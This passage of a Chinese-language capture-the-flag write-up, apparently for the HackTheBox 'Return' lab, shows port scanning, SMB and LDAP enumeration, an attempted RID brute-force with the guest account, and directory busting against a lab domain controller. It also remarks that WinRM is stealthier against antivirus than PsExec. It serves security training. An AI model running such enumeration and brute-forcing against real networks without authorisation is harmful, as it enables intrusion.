class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(root㉿kaada)</span>-[<span class="hljs-string">/home/kali/Desktop</span>]<br>└─<span class="hljs-comment"># ./rustscan -a 10.129.217.15 -r 1-65535 --ulimit 5000 -- -A -sV -sC</span><br><span class="hljs-string">.----.</span> <span class="hljs-string">.-.</span> <span class="hljs-string">.-.</span> <span class="hljs-string">.----..---.</span>  <span class="hljs-string">.----.</span> <span class="hljs-string">.---.</span>   <span class="hljs-string">.--.</span>  <span class="hljs-string">.-.</span> <span class="hljs-string">.-.</span><br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |<br>| <span class="hljs-string">.-.</span> \| &#123;_&#125; |<span class="hljs-string">.-._</span>&#125; &#125; | |  <span class="hljs-string">.-._</span>&#125; &#125;\     &#125;/  /\  \| |\  |<br>`-&#x27; `-&#x27;`<span class="hljs-params">-----</span>&#x27;`<span class="hljs-params">----</span>&#x27;  `-&#x27;  `<span class="hljs-params">----</span>&#x27;  `<span class="hljs-params">---</span>&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;<br>The Modern Day Port Scanner.<br>________________________________________<br>: http:<span class="hljs-string">//discord.skerritt.blog</span>         :<br>: https:<span class="hljs-string">//github.com/RustScan/RustScan</span> :<br> <span class="hljs-params">--------------------------------------</span><br>Open ports, closed hearts.<br><br>[~] The config file is expected to be at <span class="hljs-string">&quot;/root/.rustscan.toml&quot;</span><br>[~] Automatically increasing ulimit value to 5000.<br>Open 10.129.217.15<span class="hljs-function">:80</span><br>Open 10.129.217.15<span class="hljs-function">:88</span><br>Open 10.129.217.15<span class="hljs-function">:135</span><br>Open 10.129.217.15<span class="hljs-function">:139</span><br>Open 10.129.217.15<span class="hljs-function">:389</span><br>Open 10.129.217.15<span class="hljs-function">:593</span><br>Open 10.129.217.15<span class="hljs-function">:636</span><br>Open 10.129.217.15<span class="hljs-function">:3268</span><br>Open 10.129.217.15<span class="hljs-function">:3269</span><br>Open 10.129.217.15<span class="hljs-function">:5985</span><br>Open 10.129.217.15<span class="hljs-function">:9389</span><br>Open 10.129.217.15<span class="hljs-function">:53</span><br>Open 10.129.217.15<span class="hljs-function">:464</span><br>Open 10.129.217.15<span class="hljs-function">:445</span><br>Open 10.129.217.15<span class="hljs-function">:47001</span><br>Open 10.129.217.15<span class="hljs-function">:63229</span><br>[~] Starting Script<span class="hljs-params">(s)</span><br>[&gt;] Running script <span class="hljs-string">&quot;nmap -vvv -p &#123;&#123;port&#125;&#125; -&#123;&#123;ipversion&#125;&#125; &#123;&#123;ip&#125;&#125; -A -sV -sC&quot;</span> on ip 10.129.217.15<br>Depending on the complexity of the script, results may take some time to appear.<br>[~] Starting Nmap 7.95 <span class="hljs-params">( https://nmap.org )</span> at 2026-01-14 21<span class="hljs-function">:15</span> EST<br>NSE: Loaded 157 scripts for scanning.<br>NSE: Script Pre-scanning.<br>NSE: Starting runlevel 1 <span class="hljs-params">(of 3)</span> scan.<br>Initiating NSE at 21<span class="hljs-function">:15</span><br>Completed NSE at 21<span class="hljs-function">:15</span>, 0.00s elapsed<br>NSE: Starting runlevel 2 <span class="hljs-params">(of 3)</span> scan.<br>Initiating NSE at 21<span class="hljs-function">:15</span><br>Completed NSE at 21<span class="hljs-function">:15</span>, 0.00s elapsed<br>NSE: Starting runlevel 3 <span class="hljs-params">(of 3)</span> scan.<br>Initiating NSE at 21<span class="hljs-function">:15</span><br>Completed NSE at 21<span class="hljs-function">:15</span>, 0.00s elapsed<br>Initiating Ping Scan at 21<span class="hljs-function">:15</span><br>Scanning 10.129.217.15 [4 ports]<br>Completed Ping Scan at 21<span class="hljs-function">:15</span>, 1.65s elapsed <span class="hljs-params">(1 total hosts)</span><br>Initiating Parallel DNS resolution of 1 host. at 21<span class="hljs-function">:15</span><br>Completed Parallel DNS resolution of 1 host. at 21<span class="hljs-function">:15</span>, 0.00s elapsed<br>DNS resolution of 1 IPs took 0.00s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br>Initiating SYN Stealth Scan at 21<span class="hljs-function">:15</span><br>Scanning 10.129.217.15 [16 ports]<br>Discovered open port 53/tcp on 10.129.217.15<br>Discovered open port 80/tcp on 10.129.217.15<br>Discovered open port 135/tcp on 10.129.217.15<br>Discovered open port 139/tcp on 10.129.217.15<br>Discovered open port 63229/tcp on 10.129.217.15<br>Discovered open port 445/tcp on 10.129.217.15<br>Discovered open port 464/tcp on 10.129.217.15<br>Discovered open port 5985/tcp on 10.129.217.15<br>Discovered open port 9389/tcp on 10.129.217.15<br>Discovered open port 389/tcp on 10.129.217.15<br>Discovered open port 88/tcp on 10.129.217.15<br>Discovered open port 3268/tcp on 10.129.217.15<br>Discovered open port 47001/tcp on 10.129.217.15<br>Discovered open port 636/tcp on 10.129.217.15<br>Discovered open port 593/tcp on 10.129.217.15<br>Discovered open port 3269/tcp on 10.129.217.15<br>Completed SYN Stealth Scan at 21<span class="hljs-function">:15</span>, 0.21s elapsed <span class="hljs-params">(16 total ports)</span><br>Initiating Service scan at 21<span class="hljs-function">:15</span><br>Scanning 16 services on 10.129.217.15<br>Stats: 0<span class="hljs-function">:00</span><span class="hljs-function">:46</span> elapsed; 0 hosts completed <span class="hljs-params">(1 up)</span>, 1 undergoing Service Scan<br>Service scan Timing: About 93.75% done; ETC: 21<span class="hljs-function">:16</span> <span class="hljs-params">(0:00:03 remaining)</span><br>Completed Service scan at 21<span class="hljs-function">:16</span>, 57.06s elapsed <span class="hljs-params">(16 services on 1 host)</span><br>Initiating OS detection <span class="hljs-params">(try #1)</span> against 10.129.217.15<br>Retrying OS detection <span class="hljs-params">(try #2)</span> against 10.129.217.15<br>Initiating Traceroute at 21<span class="hljs-function">:16</span><br>Completed Traceroute at 21<span class="hljs-function">:16</span>, 0.09s elapsed<br>Initiating Parallel DNS resolution of 2 hosts. at 21<span class="hljs-function">:16</span><br>Completed Parallel DNS resolution of 2 hosts. at 21<span class="hljs-function">:16</span>, 0.00s elapsed<br>DNS resolution of 2 IPs took 0.00s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]</span><br>NSE: Script scanning 10.129.217.15.<br>NSE: Starting runlevel 1 <span class="hljs-params">(of 3)</span> scan.<br>Initiating NSE at 21<span class="hljs-function">:16</span><br>Completed NSE at 21<span class="hljs-function">:16</span>, 9.36s elapsed<br>NSE: Starting runlevel 2 <span class="hljs-params">(of 3)</span> scan.<br>Initiating NSE at 21<span class="hljs-function">:16</span><br>Completed NSE at 21<span class="hljs-function">:16</span>, 2.46s elapsed<br>NSE: Starting runlevel 3 <span class="hljs-params">(of 3)</span> scan.<br>Initiating NSE at 21<span class="hljs-function">:16</span><br>Completed NSE at 21<span class="hljs-function">:16</span>, 0.00s elapsed<br>Nmap scan report for 10.129.217.15<br>Host is up, received reset ttl 127 <span class="hljs-params">(0.088s latency)</span>.<br>Scanned at 2026-01-14 21<span class="hljs-function">:15</span><span class="hljs-function">:24</span> EST for 72s<br><br>PORT      STATE SERVICE       REASON          VERSION<br>53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus<br>80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0<br>| http-methods: <br>|   Supported Methods: OPTIONS TRACE GET HEAD POST<br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: HTB Printer Admin Panel<br>88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos <span class="hljs-params">(server time: 2026-01-15 02:34:06Z)</span><br>135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="hljs-params">(Domain: return.local0., Site: Default-First-Site-Name)</span><br>445/tcp   open  microsoft-ds? syn-ack ttl 127<br>464/tcp   open  kpasswd5?     syn-ack ttl 127<br>593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  tcpwrapped    syn-ack ttl 127<br>3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP <span class="hljs-params">(Domain: return.local0., Site: Default-First-Site-Name)</span><br>3269/tcp  open  tcpwrapped    syn-ack ttl 127<br>5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 <span class="hljs-params">(SSDP/UPnP)</span><br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>9389/tcp  open  mc-nmf        syn-ack ttl 127 <span class="hljs-string">.NET</span> Message Framing<br>47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 <span class="hljs-params">(SSDP/UPnP)</span><br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>63229/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete<br>Aggressive OS guesses: Microsoft Windows Server 2016 <span class="hljs-params">(96%)</span>, Microsoft Windows Server 2019 <span class="hljs-params">(96%)</span>, Microsoft Windows 10 <span class="hljs-params">(93%)</span>, Microsoft Windows 10 1709 - 21H2 <span class="hljs-params">(93%)</span>, Microsoft Windows 10 1903 <span class="hljs-params">(93%)</span>, Microsoft Windows 10 21H1 <span class="hljs-params">(93%)</span>, Microsoft Windows Server 2012 <span class="hljs-params">(93%)</span>, Microsoft Windows Server 2022 <span class="hljs-params">(93%)</span>, Windows Server 2019 <span class="hljs-params">(92%)</span>, Microsoft Windows Vista SP1 <span class="hljs-params">(92%)</span><br>No exact OS matches for host <span class="hljs-params">(test conditions non-ideal)</span>.<br>TCP/IP fingerprint:<br>SCAN<span class="hljs-params">(<span class="hljs-attr">V</span>=7.95%<span class="hljs-attr">E</span>=4%<span class="hljs-attr">D</span>=1/14%<span class="hljs-attr">OT</span>=53%<span class="hljs-attr">CT</span>=%<span class="hljs-attr">CU</span>=42462%<span class="hljs-attr">PV</span>=Y%<span class="hljs-attr">DS</span>=2%<span class="hljs-attr">DC</span>=T%<span class="hljs-attr">G</span>=N%<span class="hljs-attr">TM</span>=69684E04%<span class="hljs-attr">P</span>=x86_64-pc-linux-gnu)</span><br>SEQ<span class="hljs-params">(<span class="hljs-attr">SP</span>=103%<span class="hljs-attr">GCD</span>=1%<span class="hljs-attr">ISR</span>=107%<span class="hljs-attr">TI</span>=I%<span class="hljs-attr">CI</span>=I%<span class="hljs-attr">II</span>=I%<span class="hljs-attr">SS</span>=S%<span class="hljs-attr">TS</span>=U)</span><br>SEQ<span class="hljs-params">(<span class="hljs-attr">SP</span>=104%<span class="hljs-attr">GCD</span>=2%<span class="hljs-attr">ISR</span>=10A%<span class="hljs-attr">TI</span>=I%<span class="hljs-attr">CI</span>=I%<span class="hljs-attr">II</span>=I%<span class="hljs-attr">SS</span>=S%<span class="hljs-attr">TS</span>=U)</span><br>OPS<span class="hljs-params">(<span class="hljs-attr">O1</span>=M542NW8NNS%<span class="hljs-attr">O2</span>=M542NW8NNS%<span class="hljs-attr">O3</span>=M542NW8%<span class="hljs-attr">O4</span>=M542NW8NNS%<span class="hljs-attr">O5</span>=M542NW8NNS%<span class="hljs-attr">O6</span>=M542NNS)</span><br>WIN<span class="hljs-params">(<span class="hljs-attr">W1</span>=FFFF%<span class="hljs-attr">W2</span>=FFFF%<span class="hljs-attr">W3</span>=FFFF%<span class="hljs-attr">W4</span>=FFFF%<span class="hljs-attr">W5</span>=FFFF%<span class="hljs-attr">W6</span>=FF70)</span><br>ECN<span class="hljs-params">(<span class="hljs-attr">R</span>=Y%<span class="hljs-attr">DF</span>=Y%<span class="hljs-attr">T</span>=80%<span class="hljs-attr">W</span>=FFFF%<span class="hljs-attr">O</span>=M542NW8NNS%<span class="hljs-attr">CC</span>=Y%<span class="hljs-attr">Q</span>=)</span><br>T1<span class="hljs-params">(<span class="hljs-attr">R</span>=Y%<span class="hljs-attr">DF</span>=Y%<span class="hljs-attr">T</span>=80%<span class="hljs-attr">S</span>=O%<span class="hljs-attr">A</span>=S+%<span class="hljs-attr">F</span>=AS%<span class="hljs-attr">RD</span>=0%<span class="hljs-attr">Q</span>=)</span><br>T2<span class="hljs-params">(<span class="hljs-attr">R</span>=Y%<span class="hljs-attr">DF</span>=Y%<span class="hljs-attr">T</span>=80%<span class="hljs-attr">W</span>=0%<span class="hljs-attr">S</span>=Z%<span class="hljs-attr">A</span>=S%<span class="hljs-attr">F</span>=AR%<span class="hljs-attr">O</span>=%<span class="hljs-attr">RD</span>=0%<span class="hljs-attr">Q</span>=)</span><br>T3<span class="hljs-params">(<span class="hljs-attr">R</span>=Y%<span class="hljs-attr">DF</span>=Y%<span class="hljs-attr">T</span>=80%<span class="hljs-attr">W</span>=0%<span class="hljs-attr">S</span>=Z%<span class="hljs-attr">A</span>=O%<span class="hljs-attr">F</span>=AR%<span class="hljs-attr">O</span>=%<span class="hljs-attr">RD</span>=0%<span class="hljs-attr">Q</span>=)</span><br>T4<span class="hljs-params">(<span class="hljs-attr">R</span>=Y%<span class="hljs-attr">DF</span>=Y%<span class="hljs-attr">T</span>=80%<span class="hljs-attr">W</span>=0%<span class="hljs-attr">S</span>=A%<span class="hljs-attr">A</span>=O%<span class="hljs-attr">F</span>=R%<span class="hljs-attr">O</span>=%<span class="hljs-attr">RD</span>=0%<span class="hljs-attr">Q</span>=)</span><br>T5<span class="hljs-params">(<span class="hljs-attr">R</span>=Y%<span class="hljs-attr">DF</span>=Y%<span class="hljs-attr">T</span>=80%<span class="hljs-attr">W</span>=0%<span class="hljs-attr">S</span>=Z%<span class="hljs-attr">A</span>=S+%<span class="hljs-attr">F</span>=AR%<span class="hljs-attr">O</span>=%<span class="hljs-attr">RD</span>=0%<span class="hljs-attr">Q</span>=)</span><br>T6<span class="hljs-params">(<span class="hljs-attr">R</span>=Y%<span class="hljs-attr">DF</span>=Y%<span class="hljs-attr">T</span>=80%<span class="hljs-attr">W</span>=0%<span class="hljs-attr">S</span>=A%<span class="hljs-attr">A</span>=O%<span class="hljs-attr">F</span>=R%<span class="hljs-attr">O</span>=%<span class="hljs-attr">RD</span>=0%<span class="hljs-attr">Q</span>=)</span><br>T7<span class="hljs-params">(<span class="hljs-attr">R</span>=Y%<span class="hljs-attr">DF</span>=Y%<span class="hljs-attr">T</span>=80%<span class="hljs-attr">W</span>=0%<span class="hljs-attr">S</span>=Z%<span class="hljs-attr">A</span>=S+%<span class="hljs-attr">F</span>=AR%<span class="hljs-attr">O</span>=%<span class="hljs-attr">RD</span>=0%<span class="hljs-attr">Q</span>=)</span><br>U1<span class="hljs-params">(<span class="hljs-attr">R</span>=Y%<span class="hljs-attr">DF</span>=N%<span class="hljs-attr">T</span>=80%<span class="hljs-attr">IPL</span>=164%<span class="hljs-attr">UN</span>=0%<span class="hljs-attr">RIPL</span>=G%<span class="hljs-attr">RID</span>=G%<span class="hljs-attr">RIPCK</span>=G%<span class="hljs-attr">RUCK</span>=G%<span class="hljs-attr">RUD</span>=G)</span><br>IE<span class="hljs-params">(<span class="hljs-attr">R</span>=Y%<span class="hljs-attr">DFI</span>=N%<span class="hljs-attr">T</span>=80%<span class="hljs-attr">CD</span>=Z)</span><br><br>Network Distance: 2 hops<br>TCP Sequence Prediction: Difficulty=259 <span class="hljs-params">(Good luck!)</span><br>IP ID Sequence Generation: Incremental<br>Service Info: Host: PRINTER; OS: Windows; CPE: cpe:<span class="hljs-string">/o</span><span class="hljs-function">:microsoft</span><span class="hljs-function">:windows</span><br><br>Host script results:<br>| p2p-conficker: <br>|   Checking for Conficker.C or higher.<span class="hljs-string">..</span><br>|   Check 1 <span class="hljs-params">(port 43714/tcp)</span>: CLEAN <span class="hljs-params">(Couldn&#x27;t connect)</span><br>|   Check 2 <span class="hljs-params">(port 24974/tcp)</span>: CLEAN <span class="hljs-params">(Couldn&#x27;t connect)</span><br>|   Check 3 <span class="hljs-params">(port 54529/udp)</span>: CLEAN <span class="hljs-params">(Failed to receive data)</span><br>|   Check 4 <span class="hljs-params">(port 51924/udp)</span>: CLEAN <span class="hljs-params">(Timeout)</span><br>|_  0/4 checks are positive: Host is CLEAN or ports are blocked<br>|_clock-skew: 18m33s<br>| smb2-security-mode: <br>|   3<span class="hljs-function">:1</span><span class="hljs-function">:1</span>: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   date: 2026-01-15T02<span class="hljs-function">:35</span><span class="hljs-function">:03</span><br>|_  start_date: N/A<br><br>TRACEROUTE <span class="hljs-params">(using port 80/tcp)</span><br>HOP RTT      ADDRESS<br>1   83.25 ms 10.10.14.1<br>2   83.56 ms 10.129.217.15<br><br>NSE: Script Post-scanning.<br>NSE: Starting runlevel 1 <span class="hljs-params">(of 3)</span> scan.<br>Initiating NSE at 21<span class="hljs-function">:16</span><br>Completed NSE at 21<span class="hljs-function">:16</span>, 0.00s elapsed<br>NSE: Starting runlevel 2 <span class="hljs-params">(of 3)</span> scan.<br>Initiating NSE at 21<span class="hljs-function">:16</span><br>Completed NSE at 21<span class="hljs-function">:16</span>, 0.00s elapsed<br>NSE: Starting runlevel 3 <span class="hljs-params">(of 3)</span> scan.<br>Initiating NSE at 21<span class="hljs-function">:16</span><br>Completed NSE at 21<span class="hljs-function">:16</span>, 0.00s elapsed<br>Read data files from: <span class="hljs-string">/usr/share/nmap</span><br>OS and Service detection performed. Please report any incorrect results at https:<span class="hljs-string">//nmap.org/submit/</span> .<br>Nmap done: 1 IP address <span class="hljs-params">(1 host up)</span> scanned in 74.35 seconds<br>           Raw packets sent: 62 <span class="hljs-params">(4.092KB)</span> | Rcvd: 61 <span class="hljs-params">(3.808KB)</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>端口组合特征</strong>：同时开放了 <strong>53 (DNS)</strong>、<strong>88 (Kerberos)</strong>、<strong>389 (LDAP)</strong> 和 <strong>445 (SMB)</strong>。这是典型的 <strong>Windows 域控制器 (Domain Controller)</strong> 特征。这意味着我们面对的不仅仅是一台普通的服务器，而是域环境的核心。</p>
+<p><strong>远程管理入口</strong>：</p>
+<ul>
+<li><strong>5985 (WinRM)</strong>：开放了 Windows Remote Management 服务。这是一个非常关键的发现，因为相比于 SMB (445) 需要通过 PsExec 等容易被杀软拦截的方式执行命令，WinRM 是 Windows 原生的管理协议，如果我们能拿到凭据，通过 Evil-WinRM 登录通常更稳定且隐蔽性更好。</li>
+<li><strong>593 (HTTP-RPC-EPMAP)</strong>：这也是域环境中常见的 RPC over HTTP 端口，常用于 DCOM 通信。</li>
+</ul>
+</blockquote>
+<p>将扫描所得域名填入hosts</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-meta"># echo <span class="hljs-string">&quot;10.129.217.15 return.local printer.return.local&quot;</span> | tee -a /etc/hosts</span><br><span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span> <span class="hljs-keyword">return</span>.<span class="hljs-keyword">local</span> printer.<span class="hljs-keyword">return</span>.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="2-服务枚举与-Web-探测-Service-Enumeration"><a href="#2-服务枚举与-Web-探测-Service-Enumeration" class="headerlink" title="2. 服务枚举与 Web 探测 (Service Enumeration)"></a>2. 服务枚举与 Web 探测 (Service Enumeration)</h3><p>smb服务探测</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>  <br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:PRINTER) (<span class="hljs-keyword">domain</span>:<span class="hljs-keyword">return</span>.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">False</span>) <br><br>┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# smbclient -L //<span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>                        <br><span class="hljs-keyword">Password</span> <span class="hljs-keyword">for</span> [WORKGROUP\root]:<br>Anonymous <span class="hljs-keyword">login</span> successful<br><br>        Sharename       <span class="hljs-keyword">Type</span>      <span class="hljs-keyword">Comment</span><br>        <span class="hljs-comment">---------       ----      -------</span><br>Reconnecting <span class="hljs-keyword">with</span> SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">to</span> <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">with</span> SMB1 <span class="hljs-comment">-- no workgroup available</span><br><br></code></pre></td></tr></table></figure>
+
+<p>不允许匿名登录</p>
+<p>enum4linux全面探测</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# enum4linux -<span class="hljs-keyword">A</span> <span class="hljs-number">10.129.217.15</span>                                               <br>Starting enum4linux v0.<span class="hljs-number">9</span>.<span class="hljs-number">1</span> ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan <span class="hljs-number">14 21:20:57</span> <span class="hljs-number">2026</span><br><br> =========================================( Target Information )=========================================<br>                                                                                                                                                           <br>Target ........... <span class="hljs-number">10.129.217.15</span>                                                                                                                           <br>RID Range ........ <span class="hljs-number">500-550</span>,<span class="hljs-number">1000-1050</span><br>Username ......... &#x27;&#x27;<br>Password ......... &#x27;&#x27;<br>Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br><br><br> ===========================( Enumerating Workgroup/Domain on <span class="hljs-number">10.129.217.15</span> )===========================<br>                                                                                                                                                           <br>                                                                                                                                                           <br>[E] Can&#x27;t find workgroup/domain                                                                                                                            <br>                                                                                                                                                           <br>                                                                                                                                                           <br><br> ===================================( Session Check on <span class="hljs-number">10.129.217.15</span> )===================================<br>                                                                                                                                                           <br>                                                                                                                                                           <br>[+] Server <span class="hljs-number">10.129.217.15</span> allows sessions using username &#x27;&#x27;, password &#x27;&#x27;                                                                                    <br>                                                                                                                                                           <br>                                                                                                                                                           <br> ================================( Getting domain SID for <span class="hljs-number">10.129.217.15</span> )================================<br>                                                                                                                                                           <br>Domain Name: RETURN                                                                                                                                        <br>Domain Sid: S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3750359090</span>-<span class="hljs-number">2939318659</span>-<span class="hljs-number">876128439</span><br><br>[+] Host is part of a domain (not a workgroup)                                                                                                             <br>                                                                                                                                                           <br>enum4linux complete on Wed Jan <span class="hljs-number">14 21:21:09</span> <span class="hljs-number">2026</span>           <br></code></pre></td></tr></table></figure>
+
+<p>没有找到什么有价值的信息，试一试用guest账户爆破用户名。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-keyword">return</span>.<span class="hljs-keyword">local</span> -u guest -p <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">--rid-brute</span><br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:PRINTER) (<span class="hljs-keyword">domain</span>:<span class="hljs-keyword">return</span>.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">False</span>)                                                                                                                                                    <br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          [-] <span class="hljs-keyword">return</span>.<span class="hljs-keyword">local</span>\guest: STATUS_ACCOUNT_DISABLED <br></code></pre></td></tr></table></figure>
+
+<p>guest账户被禁用，看来只能去80端口看一看有没有有价值的信息了。</p>
+<p>目录扫描爆破</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(root㉿kaada)-[<span class="hljs-regexp">/home/</span>kali/Desktop]<br>└─<span class="hljs-comment"># feroxbuster -u http://10.129.217.15 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,zip,txt,html,htm --scan-dir-listings  -C 503,404 </span><br>                                                                                                                                                           <br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | <span class="hljs-regexp">/  `    /</span>  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__<span class="hljs-regexp">/ /</span> \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: <span class="hljs-number">2.13</span>.<span class="hljs-number">0</span><br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>/<br> 🚩  In-Scope Url          │ <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><br> 🚀  Threads               │ <span class="hljs-number">50</span><br> 📖  Wordlist              │ <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>directory-list-<span class="hljs-number">2.3</span>-small.txt<br> 💢  Status Code Filters   │ [<span class="hljs-number">503</span>, <span class="hljs-number">404</span>]<br> 💥  Timeout (secs)        │ <span class="hljs-number">7</span><br> 🦡  User-Agent            │ feroxbuster/<span class="hljs-number">2.13</span>.<span class="hljs-number">0</span><br> 💉  Config File           │ <span class="hljs-regexp">/etc/</span>feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ true<br> 📂  Scan Dir Listings     │ true<br> 💲  Extensions            │ [php, zip, txt, html, htm]<br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ <span class="hljs-number">4</span><br> 🎉  New Version Available │ https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/epi052/</span>feroxbuster<span class="hljs-regexp">/releases/</span>latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br><span class="hljs-number">404</span>      GET       <span class="hljs-number">29</span>l       <span class="hljs-number">95</span>w     <span class="hljs-number">1245</span>c Auto-filtering found <span 